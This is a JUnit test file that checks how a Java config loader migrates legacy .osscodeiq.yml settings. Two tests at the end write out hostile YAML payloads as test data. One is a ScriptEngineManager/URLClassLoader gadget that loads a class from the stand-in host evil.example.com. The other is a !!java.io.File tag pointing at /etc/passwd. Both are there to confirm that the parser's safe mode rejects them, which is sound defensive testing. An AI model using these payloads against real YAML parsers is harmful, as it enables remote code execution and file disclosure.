package io.github.randomcodespace.iq.config;

import io.github.randomcodespace.iq.config.unified.CodeIqUnifiedConfig;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.io.TempDir;

import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;

import static org.junit.jupiter.api.Assertions.*;

/**
 * End-to-end tests for the legacy {@code .osscodeiq.yml} migration path.
 *
 * <p>Post-Phase-B cleanup, there is no public static {@code loadIfPresent} /
 * {@code loadProjectConfig} API on {@link ProjectConfigLoader}. The same
 * behaviour is now exercised through the canonical shim
 * {@link ProjectConfigLoader#loadFrom(Path)}, which returns a
 * {@link CodeIqUnifiedConfig} overlay for the PROJECT layer. Legacy flat
 * keys ({@code cache_dir}, {@code max_depth}, {@code max_radius}) are
 * translated into the unified tree and projected onto the legacy
 * {@link CodeIqConfig} bean via {@link UnifiedConfigAdapter}.
 *
 * <p>The tests here pin the end-to-end behaviour of that migration path so
 * existing {@code .osscodeiq.yml} users continue to get identical outcomes
 * during the deprecation window.
 */
class ProjectConfigLoaderApplyOverridesTest {

    private static ProjectConfigLoader.LoadResult loadLegacy(Path repo, String yaml) throws IOException {
        Files.writeString(repo.resolve(".osscodeiq.yml"), yaml, StandardCharsets.UTF_8);
        return new ProjectConfigLoader().loadFrom(repo);
    }

    // ---- Legacy flat-key overrides project onto CodeIqConfig via the adapter ----

    @Test
    void legacyCacheDirFlowsThroughToCodeIqConfig(@TempDir Path tempDir) throws IOException {
        ProjectConfigLoader.LoadResult r = loadLegacy(tempDir,
                "cache_dir: my-custom-cache\n");
        CodeIqConfig adapted = UnifiedConfigAdapter.toCodeIqConfig(r.config());
        assertEquals("my-custom-cache", adapted.getCacheDir());
        assertTrue(r.deprecationWarningEmitted(),
                ".osscodeiq.yml must emit a one-time deprecation WARN");
    }

    @Test
    void legacyMaxDepthAndMaxRadiusFlowThroughToCodeIqConfig(@TempDir Path tempDir) throws IOException {
        ProjectConfigLoader.LoadResult r = loadLegacy(tempDir,
                "max_depth: 20\nmax_radius: 15\n");
        CodeIqConfig adapted = UnifiedConfigAdapter.toCodeIqConfig(r.config());
        assertEquals(20, adapted.getMaxDepth());
        assertEquals(15, adapted.getMaxRadius());
    }

    @Test
    void legacyCombinedFlatKeysAllApply(@TempDir Path tempDir) throws IOException {
        ProjectConfigLoader.LoadResult r = loadLegacy(tempDir,
                "cache_dir: override-cache\nmax_depth: 5\nmax_radius: 3\n");
        CodeIqConfig adapted = UnifiedConfigAdapter.toCodeIqConfig(r.config());
        assertEquals("override-cache", adapted.getCacheDir());
        assertEquals(5, adapted.getMaxDepth());
        assertEquals(3, adapted.getMaxRadius());
    }

    // ---- Legacy filter sections flow into CodeIqUnifiedConfig ------------------

    @Test
    void legacyLanguagesSectionPopulatesIndexing(@TempDir Path tempDir) throws IOException {
        ProjectConfigLoader.LoadResult r = loadLegacy(tempDir,
                // Include at least one legacy flat key so translateLegacyToUnified is used
                // (otherwise loadFrom delegates to the canonical UnifiedConfigLoader, which
                // is also fine but a different code path tested elsewhere).
                "cache_dir: .cache\nlanguages: [java, python, typescript]\n");
        CodeIqUnifiedConfig cfg = r.config();
        assertNotNull(cfg.indexing().languages());
        assertEquals(3, cfg.indexing().languages().size());
        assertTrue(cfg.indexing().languages().contains("java"));
        assertTrue(cfg.indexing().languages().contains("python"));
    }

    @Test
    void legacyDetectorsSectionPopulatesDetectors(@TempDir Path tempDir) throws IOException {
        ProjectConfigLoader.LoadResult r = loadLegacy(tempDir,
                "cache_dir: .cache\n"
              + "detectors:\n"
              + "  categories: [endpoints, entities]\n"
              + "  include: [spring-rest-detector]\n");
        CodeIqUnifiedConfig cfg = r.config();
        assertEquals(java.util.List.of("endpoints", "entities"), cfg.detectors().categories());
        assertEquals(java.util.List.of("spring-rest-detector"), cfg.detectors().include());
    }

    @Test
    void legacyPipelineSectionPopulatesIndexing(@TempDir Path tempDir) throws IOException {
        ProjectConfigLoader.LoadResult r = loadLegacy(tempDir,
                "cache_dir: .cache\n"
              + "pipeline:\n"
              + "  parallelism: 4\n"
              + "  batch-size: 100\n");
        CodeIqUnifiedConfig cfg = r.config();
        assertEquals(4, cfg.indexing().parallelism());
        assertEquals(100, cfg.indexing().batchSize());
    }

    @Test
    void legacyExcludePatternsPopulateIndexing(@TempDir Path tempDir) throws IOException {
        ProjectConfigLoader.LoadResult r = loadLegacy(tempDir,
                "cache_dir: .cache\nexclude:\n  - '*.generated.java'\n  - 'vendor/**'\n");
        CodeIqUnifiedConfig cfg = r.config();
        assertEquals(java.util.List.of("*.generated.java", "vendor/**"),
                cfg.indexing().exclude());
    }

    @Test
    void legacyParsersMapFlattensToParsersList(@TempDir Path tempDir) throws IOException {
        // The legacy `.osscodeiq.yml` shape was `parsers: {lang: parserName}` (a map).
        // The unified tree carries `indexing.parsers` as List<String>. The translator
        // flattens the map's values (Analyzer never consumed the per-language map
        // at runtime — the list is sufficient).
        ProjectConfigLoader.LoadResult r = loadLegacy(tempDir,
                "cache_dir: .cache\nparsers:\n  java: javaparser\n  python: antlr\n");
        CodeIqUnifiedConfig cfg = r.config();
        assertNotNull(cfg.indexing().parsers());
        assertTrue(cfg.indexing().parsers().contains("javaparser"),
                "flattened parser names must include 'javaparser'; got: " + cfg.indexing().parsers());
        assertTrue(cfg.indexing().parsers().contains("antlr"),
                "flattened parser names must include 'antlr'; got: " + cfg.indexing().parsers());
    }

    // ---- Missing-file and empty-repo behaviour ---------------------------------

    @Test
    void missingConfigFileReturnsEmptyOverlay(@TempDir Path tempDir) {
        ProjectConfigLoader.LoadResult r = new ProjectConfigLoader().loadFrom(tempDir);
        assertEquals(CodeIqUnifiedConfig.empty(), r.config());
        assertFalse(r.deprecationWarningEmitted(),
                "no .osscodeiq.yml means no deprecation warning");
    }

    // ---- SafeConstructor / unsafe YAML tag safety -----------------------------

    @Test
    void unsafeYamlTagDoesNotExecuteArbitraryCode(@TempDir Path tempDir) throws IOException {
        // Unsafe YAML tag that could trigger arbitrary class instantiation under a
        // non-Safe constructor. UnifiedConfigLoader uses SafeConstructor, so parsing
        // either rejects the document or returns a safe representation. Either way,
        // no arbitrary code runs.
        String yaml = "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://evil.example.com\"]]]]\n";
        Files.writeString(tempDir.resolve(".osscodeiq.yml"), yaml, StandardCharsets.UTF_8);

        // Must not throw an unchecked exception that escapes; must not execute the tag.
        assertDoesNotThrow(() -> {
            try {
                new ProjectConfigLoader().loadFrom(tempDir);
            } catch (io.github.randomcodespace.iq.config.unified.ConfigLoadException e) {
                // Expected: SafeConstructor rejects the unsafe tag with a typed exception.
                // That's the correct safe outcome; the test's invariant is "no code executed".
            }
        });
    }

    @Test
    void yamlWithMixedSafeAndUnsafeContentDoesNotExecuteCode(@TempDir Path tempDir) throws IOException {
        String yaml = """
                cache_dir: legit-cache
                exploit: !!java.io.File ["/etc/passwd"]
                """;
        Files.writeString(tempDir.resolve(".osscodeiq.yml"), yaml, StandardCharsets.UTF_8);

        // Either the parser rejects the unsafe tag (ConfigLoadException) or it safely
        // ignores it — in both cases no arbitrary code runs. The key invariant is safety.
        assertDoesNotThrow(() -> {
            try {
                new ProjectConfigLoader().loadFrom(tempDir);
            } catch (io.github.randomcodespace.iq.config.unified.ConfigLoadException e) {
                // Safe rejection — acceptable outcome.
            }
        });
    }
}
